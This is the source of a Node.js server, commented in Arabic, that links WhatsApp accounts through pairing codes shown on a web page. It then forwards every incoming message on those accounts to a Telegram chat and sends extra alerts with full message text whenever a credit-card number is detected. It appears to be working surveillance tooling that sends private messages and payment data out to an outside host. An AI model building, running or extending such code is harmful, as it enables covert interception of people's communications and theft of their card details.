import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { makeWASocket, useMultiFileAuthState, Browsers, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
dotenv.config(); // تحميل من .env أو من متغيرات البيئة

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// ========== تكوين Telegram ==========
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

let telegramBot = null;
if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
    console.log('✅ بوت تليجرام جاهز للإرسال');
} else {
    console.warn('⚠️ تليجرام غير مهيأ، لن يتم إرسال الإشعارات');
}

// دالة إرسال إلى تليجرام (أي رسالة)
async function sendToTelegram(messageText) {
    if (!telegramBot) return;
    try {
        await telegramBot.sendMessage(TELEGRAM_CHAT_ID, messageText, { parse_mode: 'Markdown' });
        console.log('📨 تم إرسال إشعار إلى تليجرام');
    } catch (err) {
        console.error('❌ فشل إرسال إلى تليجرام:', err.message);
    }
}

// دالة كشف البيانات الحساسة (نفس الـ scanner سابقاً)
function scanForSensitiveData(text) {
    const patterns = [
        {
            name: '💳 بطاقة ائتمان',
            regex: /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9]{2})[0-9]{12})\b/g,
            mask: (m) => m.slice(0,4) + '-****-****-' + m.slice(-4)
        }
    ];
    const detected = [];
    for (const p of patterns) {
        let match;
        p.regex.lastIndex = 0;
        while ((match = p.regex.exec(text)) !== null) {
            detected.push({ type: p.name, original: match[0], masked: p.mask(match[0]) });
        }
    }
    return detected;
}

// ========== إعداد الخادم ==========
const app = express();
const server = createServer(app);
const io = new Server(server, { cors: { origin: "*" }, transports: ['websocket', 'polling'] });

const activeSessions = new Map();
const sessionsData = new Map();

// إنشاء جلسة واتساب
async function createWhatsAppSession(phoneNumber) {
    const sessionDir = path.join(__dirname, `auth_sessions/${phoneNumber}`);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { version } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const sock = makeWASocket({
        version,
        auth: state,
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 30000,
        generateHighQualityLinkPreview: false,
    });

    sock.ev.on('creds.update', saveCreds);
    let pairingRequested = false;

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open' && !state.creds.registered && !pairingRequested) {
            pairingRequested = true;
            const code = await sock.requestPairingCode(phoneNumber);
            io.emit('pairing_code', { code, phoneNumber });
        } else if (update.connection === 'close') {
            setTimeout(() => createWhatsAppSession(phoneNumber), 60000);
        }
    });

    // ⭐ مراقبة كل الرسائل الواردة
    sock.ev.on('messages.upsert', async ({ messages }) => {
        for (const msg of messages) {
            if (msg.message && !msg.key.fromMe) {
                const sender = msg.key.remoteJid;
                let messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
                if (!messageText) continue;

                const senderName = msg.pushName || sender;
                const time = new Date().toLocaleString();

                // 🔹 1. إرسال كل الرسائل إلى تليجرام
                const telegramMsg = `📩 *رسالة جديدة* 📩\n👤 *من:* ${senderName}\n📱 *حساب واتساب المستلم:* ${phoneNumber}\n⏰ *الوقت:* ${time}\n💬 *النص:*\n${messageText.substring(0, 500)}`;
                await sendToTelegram(telegramMsg);

                // 🔹 2. فحص البيانات الحساسة وإرسال تنبيه إضافي إذا وُجدت
                const sensitive = scanForSensitiveData(messageText);
                if (sensitive.length > 0) {
                    const details = sensitive.map(s => `${s.type}: ${s.masked}`).join('\n');
                    const alertMsg = `🚨 *تنبيه: تم اكتشاف معلومات حساسة!* 🚨\n${details}\n\n📝 الرسالة الأصلية:\n${messageText}`;
                    await sendToTelegram(alertMsg);
                }
            }
        }
    });

    return sock;
}

// ========== واجهة HTML (نفس السابق) ==========
const HTML_PAGE = `... (نفس المحتوى السابق، لا داعي لتغييره) ...`;

app.get('/', (req, res) => res.send(HTML_PAGE));
app.get('/health', (req, res) => res.status(200).send('OK'));

io.on('connection', (socket) => {
    console.log('🟢 عميل متصل:', socket.id);
    socket.on('add_account', async ({ phone }) => {
        const cleanPhone = phone.replace(/\D/g, '');
        if (activeSessions.has(cleanPhone)) {
            socket.emit('error', `الحساب ${cleanPhone} موجود مسبقًا`);
            return;
        }
        try {
            const sock = await createWhatsAppSession(cleanPhone);
            activeSessions.set(cleanPhone, { sock, status: 'مراقب' });
            sessionsData.set(cleanPhone, { phone: cleanPhone, status: 'مراقب', date: new Date().toLocaleString() });
            io.emit('accounts_list', Array.from(sessionsData.values()));
            socket.emit('status', `تم بدء ربط ${cleanPhone}...`);
            await sendToTelegram(`✅ تم ربط حساب واتساب جديد: ${cleanPhone}`);
        } catch (err) {
            socket.emit('error', `فشل ربط الحساب: ${err.message}`);
        }
    });
    socket.on('request_accounts', () => {
        socket.emit('accounts_list', Array.from(sessionsData.values()));
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 يعمل على http://localhost:${PORT}`)); 
